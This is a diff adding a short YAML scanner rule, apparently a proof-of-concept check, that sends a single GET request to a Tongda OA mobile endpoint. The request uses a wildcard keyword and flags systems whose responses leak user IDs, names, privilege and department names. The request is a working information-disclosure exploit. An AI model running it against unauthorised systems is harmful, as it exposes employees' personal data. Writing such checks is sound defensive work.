@@ -1,0 +1,8 @@
+name: tongda-contact-list-disclosure
+rules:
+  - method: GET
+    path: "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"user_uid":') && response.body.bcontains(b'"user_name":') && response.body.bcontains(b'"priv_name":') && response.body.bcontains(b'"dept_name":')
+detail:
+  author: 666
